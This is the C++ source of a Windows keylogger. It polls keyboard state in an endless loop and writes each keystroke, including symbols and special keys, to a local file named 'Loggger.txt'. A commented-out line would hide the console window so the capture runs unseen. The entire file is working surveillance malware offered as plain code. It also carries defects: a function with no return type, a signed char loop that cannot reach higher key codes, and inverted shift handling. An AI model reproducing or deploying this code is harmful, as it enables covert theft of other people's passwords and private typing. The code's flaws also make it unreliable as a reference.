#include<windows.h>
#include<winuser.h>
#include<iostream>
#include<fstream>
#include<string>
#include<unordered_map>
using namespace std;
bool isKeyPressed(char i){
	return GetAsyncKeyState(i) < 0;
}
void loopUntilReleased(char i){
	while(isKeyPressed(i)){}
}
bool isShiftPressed(){
	return GetAsyncKeyState(0x10);
}
bool isAlphabet(char i){
	return i>64 && i<91;
}
bool isNumber(char i){
	return i>47 && i<58;
}
string checkForActualKey(unordered_map<int,string>&map){
	for(auto key:map){
		if(GetAsyncKeyState(key.first))
			return map[key.first];
	}
	return "";
}
char getSymbol(char i,unordered_map<int,char>&symbols){
	return symbols[int(i)];
}
insertinMap(unordered_map<int,string>&map,unordered_map<int,char>&symbols){
	map[0x14] = "CAPSLOCK";
	map[0x20] = "SPACEBAR";
	map[0x08] = "BACKSPACE";
	map[0x90] = "NUMLOCK";
	map[0x6A] = "*";
	map[0x6B] = "+";
	map[0x6D] = "-";
	map[0x6E] = ".";
	map[0x6F] = "/";
	map[0x60] = "0";
	map[0x61] = "1";
	map[0x62] = "2";
	map[0x63] = "3";
	map[0x64] = "4";
	map[0x65] = "5";
	map[0x66] = "6";
	map[0x67] = "7";
	map[0x68] = "8";
	map[0x69] = "9";
	map[0xBA] = ";";
	map[187] = 	"=";
	map[188] = 	",";
	map[189] = 	"_";
	map[190] = 	".";
	map[191] = 	"/";
	map[220] = 	"\\";
	map[221] = 	"]";
	map[219] = 	"[";
	map[222] = 	"'";
	
	symbols[49] = '!';
	symbols[50] = '@';
	symbols[51] = '#';
	symbols[52] = '$';
	symbols[53] = '%';
	symbols[54] = '^';
	symbols[55] = '&';
	symbols[56] = '*';
	symbols[57] = '(';
	symbols[48] = ')';
}
int main(){
//	ShowWindow(GetConsoleWindow(), SW_HIDE);
	ofstream file;
	file.open("Loggger.txt",ios::out);
	bool isShiftEnabled = false;
	unordered_map<int,string>map;
	unordered_map<int,char>symbols;
	
	insertinMap(map,symbols);
	while(true){
	
		for(char i = 8;i<=222;i++)
			if(isKeyPressed(i)){
				if(isShiftPressed())
					isShiftEnabled = true;
				else
					isShiftEnabled = false;
				if(isAlphabet(i) && isShiftEnabled){
					file<<char(i+32)<<endl;
					loopUntilReleased(i);
				}
				else if(isAlphabet(i) && !isShiftEnabled){
					file<<i<<endl;
					loopUntilReleased(i);
				}
				else if(isNumber(i) && !isShiftEnabled){
					file<<i<<endl;
					loopUntilReleased(i);
				}
				else if(isNumber(i) && isShiftEnabled){
					file<<getSymbol(i,symbols)<<endl;
					loopUntilReleased(i);
				}
				else if(i!=16){
					file<<checkForActualKey(map)<<endl;
					loopUntilReleased(i);
				}
					
					
			}
	}
	file.close();	
	
}
